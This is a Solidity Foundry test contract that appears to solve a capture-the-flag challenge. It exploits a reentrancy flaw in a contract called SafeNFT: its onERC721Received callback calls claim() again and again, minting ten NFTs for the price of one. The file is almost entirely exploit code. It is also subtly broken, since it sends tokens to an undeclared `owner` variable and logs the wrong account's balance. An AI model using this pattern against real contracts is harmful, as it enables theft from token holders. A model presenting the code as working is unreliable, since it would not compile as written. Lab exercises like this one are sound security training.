// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {SafeNFT} from "../../src/safeNFT/safeNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SafeNFTChallenge is Test, IERC721Receiver {
    uint private claimed = 0;
    uint private count = 10;
    SafeNFT private target;

    constructor() {
        string memory tokenName = "SafeNFT";
        string memory tokenSymbol = "SNFT";
        uint256 price = 0.01 ether;
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("safeNFT.sol:safeNFT"),
            abi.encode(tokenName, tokenSymbol, price)
        );

        address deployedAddress;
        assembly {
            deployedAddress := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        
        require(deployedAddress != address(0), "Deployment failed");

        console.log("Deployed address: %s", deployedAddress);

        target = SafeNFT(deployedAddress);
    }

    function test() public {
        target.buyNFT{value: 0.01 ether}();
        target.claim();
        console.log(target.balanceOf(msg.sender));
    }

    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 tokenId,
        bytes calldata /*data*/
    ) external override returns (bytes4) {
        // forward the claimed NFT to yourself
        target.transferFrom(address(this), owner, tokenId);
        // re-enter to mint 10 NFTs
        claimed++;
        if (claimed != count) {
            target.claim();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}